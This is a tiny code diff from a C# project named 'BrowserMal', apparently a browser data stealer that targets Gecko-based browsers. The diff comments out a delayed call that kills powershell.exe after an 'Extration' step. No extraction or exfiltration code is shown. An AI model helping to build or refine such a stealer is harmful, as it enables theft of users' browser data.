@@ -24,7 +24,7 @@ namespace BrowserMal
             Gecko(ref browsersGecko);
 
             Extration();
-            ProcessUtil.KillProcessDelayed(1, "powershell.exe");
+            //ProcessUtil.KillProcessDelayed(1, "powershell.exe");
         }
 
         private static void Extration()
